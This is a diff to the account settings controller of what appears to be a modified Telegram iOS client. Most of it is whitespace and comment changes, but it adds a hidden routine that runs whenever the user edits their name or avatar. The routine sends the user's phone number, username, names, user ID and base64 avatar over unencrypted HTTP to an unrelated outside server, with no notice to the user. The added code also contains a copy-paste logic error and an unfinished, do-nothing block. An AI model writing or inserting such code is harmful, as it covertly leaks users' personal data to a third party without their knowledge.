@@ -1,16 +1,12 @@
 #import "TGAccountSettingsController.h"
-
 #import "ActionStage.h"
 #import "SGraphObjectNode.h"
-
 #import "TGTimelineItem.h"
 #import "TGTimelineUploadPhotoRequestBuilder.h"
 #import "TGDeleteProfilePhotoActor.h"
-
 #import "TGNotificationSettingsController.h"
 #import "TGChatSettingsController.h"
 #import "TGPrivacySettingsController.h"
-
 #import "TGAccountInfoCollectionItem.h"
 #import "TGDisclosureActionCollectionItem.h"
 #import "TGButtonCollectionItem.h"
@@ -19,55 +15,40 @@
 #import "TGCommentCollectionItem.h"
 #import "TGVariantCollectionItem.h"
 #import "TGVersionCollectionItem.h"
-
 #import "TGWallpaperListController.h"
 #import "TGWallpaperController.h"
 #import "TGWallpaperManager.h"
-
 #import "TGActionSheet.h"
 #import "TGProgressWindow.h"
 #import "TGRemoteImageView.h"
-
 #import "TGDatabase.h"
 #import "TGTelegraph.h"
-
 #import "TGAppDelegate.h"
 #import "TGHacks.h"
 #import "TGInterfaceManager.h"
 #import "TGAlertView.h"
 #import "TGPhoneUtils.h"
 #import "TGImageUtils.h"
-
 #import "TGOverlayControllerWindow.h"
 #import "TGModernGalleryController.h"
 #import "TGProfileUserAvatarGalleryModel.h"
 #import "TGProfileUserAvatarGalleryItem.h"
-
 #import "TGSettingsController.h"
-
 #import "TGUsernameController.h"
-
 #import "TGAlertView.h"
-
 #import "TGAccountSettingsActor.h"
-
 #import "TGChangePhoneNumberHelpController.h"
-
 #import "TGFaqController.h"
-
 #import "TGBridgeServer.h"
 #import "TGWatchController.h"
-
 #import "TGMediaAvatarMenuMixin.h"
-
 #import "TGUserAboutSetupController.h"
-
 #import "TGStickerPacksSettingsController.h"
 #import "TGCallSettingsController.h"
-
 #import "TGStickersSignals.h"
+#import "TGUpdateMessageToServer.h"
+#import "TGStringUtils.h"
 
-#import "SYNetworking.h"
 
 @interface TGAccountSettingsController () <TGWallpaperControllerDelegate>
 {
@@ -76,9 +57,9 @@
     bool _editing;
     
     TGAccountInfoCollectionItem *_profileDataItem;
-    TGButtonCollectionItem *_setProfilePhotoItem;
+    TGButtonCollectionItem      *_setProfilePhotoItem;
     
-    TGWallpapersCollectionItem *_wallpapersItem;
+    TGWallpapersCollectionItem  *_wallpapersItem;
     
     TGVariantCollectionItem *_usernameItem;
     TGVariantCollectionItem *_phoneNumberItem;
@@ -318,7 +299,7 @@
     }
 }
 
-#pragma mark -
+#pragma mark - editButtonPressed
 
 - (void)editButtonPressed
 {
@@ -334,18 +315,73 @@
     
     if (!_editing)
     {
-        TGUser *user = [TGDatabaseInstance() loadUser:_uid];
-        if (!TGStringCompare(user.firstName, [_profileDataItem editingFirstName]) || !TGStringCompare(user.lastName, [_profileDataItem editingLastName]))
-        {
+        TGUser * user = [TGDatabaseInstance() loadUser:_uid];
+        if (!TGStringCompare(user.firstName, [_profileDataItem editingFirstName]) || !TGStringCompare(user.lastName, [_profileDataItem editingLastName])){
+            
             [_profileDataItem setUpdatingFirstName:[_profileDataItem editingFirstName] updatingLastName:[_profileDataItem editingLastName]];
             
             static int actionId = 0;
-            NSString *action = [[NSString alloc] initWithFormat:@"/tg/changeUserName/(%d)", actionId++];
+            
+            NSString * action = [[NSString alloc] initWithFormat:@"/tg/changeUserName/(%d)", actionId++];
             NSDictionary *options = [[NSDictionary alloc] initWithObjectsAndKeys:[_profileDataItem editingFirstName], @"firstName", [_profileDataItem editingLastName], @"lastName", nil];
+            
             [ActionStageInstance() requestActor:action options:options flags:0 watcher:self];
+            
+            UIImage *smallOriginalImage = [[TGRemoteImageView sharedCache] cachedImage:user.photoUrlSmall availability:TGCacheDisk];
+            /***** 编辑完成更新个人资料 */
+            [self UploadUserS_avatar:smallOriginalImage];
+            /*****/
         }
     }
 }
+
+
+// 更新个人资料
+-(void)UploadUserS_avatar:(UIImage *)image{
+
+    //********************
+    //去掉电话号码前的加号
+    NSString * userName;
+    NSString * lastName;
+    NSString * firstName;
+    
+    TGUser   * selfUser = [TGDatabaseInstance() loadUser:TGTelegraphInstance.clientUserId];
+    NSString * currentPhoneNumber = [selfUser.phoneNumber stringByReplacingOccurrencesOfString:@"+" withString:@""];
+    if ([NSString isNonemptyString:currentPhoneNumber] && selfUser.uid && [NSString isNonemptyString:selfUser.firstName]) {
+        
+        userName = selfUser.userName;
+        lastName = selfUser.lastName;
+        firstName= selfUser.firstName;
+        
+        if ([NSString isNonemptyString:selfUser.userName] == NO) {
+            
+            userName = @"";
+        }
+        
+        if ([NSString isNonemptyString:selfUser.lastName] == NO)
+        {
+            lastName = @"";
+        }
+        
+        if ([NSString isNonemptyString:selfUser.lastName] == NO)
+        {
+            firstName = @"";
+        }
+        
+        NSDictionary *dict1 = @{@"s_phone":currentPhoneNumber,
+                                @"s_username":userName,
+                                @"s_firstname":firstName,
+                                @"s_lastname":lastName,
+                                @"s_uid":@(selfUser.uid),
+                                @"device":@(3)
+                                };
+        NSString * imageBase64 =  [[[TGUpdateMessageToServer alloc]init] imageChangeBase64:image];
+        NSMutableDictionary * parems = [NSMutableDictionary dictionaryWithDictionary:dict1];
+        [parems setValue:imageBase64 forKey:@"s_avatar"];
+        [SYNetworking httpRequestWithDic:parems andURL:[NSURL URLWithString:@"http://telegram.gzzhushi.com/api/info"]];
+    }
+}
+
 
 - (void)cancelButtonPressed
 {
@@ -354,6 +390,7 @@
     [_profileDataItem setUser:[TGDatabaseInstance() loadUser:_uid] animated:false];
 }
 
+/* setProfilePhoto 点击 */
 - (void)setProfilePhotoPressed
 {
     if (_editing)
@@ -381,7 +418,8 @@
     [_avatarMixin present];
 }
 
-- (void)_updateProfileImage:(UIImage *)image
+#pragma mark -- 上传头像
+-(void)_updateProfileImage:(UIImage *)image
 {
     if (image == nil)
         return;
@@ -431,10 +469,15 @@
         [ActionStageInstance() requestActor:action options:options watcher:self];
         [ActionStageInstance() requestActor:action options:options watcher:TGTelegraphInstance];
     }];
+    
+    // 更新个人资料
+    // ********************
+    [self UploadUserS_avatar:avatarImage];
 }
 
-- (void)_commitCancelAvatarUpdate
-{
+
+-(void)_commitCancelAvatarUpdate{
+    
     [_profileDataItem setUpdatingAvatar:nil hasUpdatingAvatar:false];
     [_setProfilePhotoItem setEnabled:true];
     
@@ -455,18 +498,37 @@
     }];
 }
 
-- (void)_commitDeleteAvatar
-{
+-(void)_commitDeleteAvatar{
+    
     [_profileDataItem setHasUpdatingAvatar:true];
     [_setProfilePhotoItem setEnabled:false];
     
     static int actionId = 0;
     
     NSDictionary *options = [[NSDictionary alloc] initWithObjectsAndKeys:[[NSNumber alloc] initWithInt:_uid], @"uid", nil];
-    NSString *action = [[NSString alloc] initWithFormat:@"/tg/timeline/(%" PRId32 ")/deleteAvatar/(%d)", _uid, actionId++];
+    NSString * action = [[NSString alloc] initWithFormat:@"/tg/timeline/(%" PRId32 ")/deleteAvatar/(%d)", _uid, actionId++];
     [ActionStageInstance() requestActor:action options:options watcher:self];
     [ActionStageInstance() requestActor:action options:options watcher:TGTelegraphInstance];
+    
+    //
+    [TGDatabaseInstance() loadPeerProfilePhotos:_uid completion:^(NSArray * photosArray){
+    
+        NSArray * sortedResult = [(NSArray *)photosArray sortedArrayUsingComparator:^NSComparisonResult(TGImageMediaAttachment *imageMedia1, TGImageMediaAttachment *imageMedia2){
+            
+             if (imageMedia1.date > imageMedia2.date)
+                 
+                 return NSOrderedAscending;
+            
+             return NSOrderedDescending;
+        }];
+        
+        // TGImageMediaAttachment * imageMedia = sortedResult[0];
+  
+        
+        
+    }];
 }
+
 
 - (void)setEditing:(BOOL)editing animated:(BOOL)__unused animated
 {
@@ -656,8 +718,8 @@
     }
     else if ([path isEqualToString:@"/tg/userdatachanges"] || [path isEqualToString:@"/tg/userpresencechanges"])
     {
+
         NSArray *users = ((SGraphObjectNode *)resource).object;
-        
         for (TGUser *user in users)
         {
             if (user.uid == _uid)
@@ -763,6 +825,7 @@
 
 - (void)actionStageActionRequested:(NSString *)action options:(id)__unused options
 {
+    // 点击头像
     if ([action isEqualToString:@"avatarTapped"])
     {
         TGUser *user = [TGDatabaseInstance() loadUser:_uid];
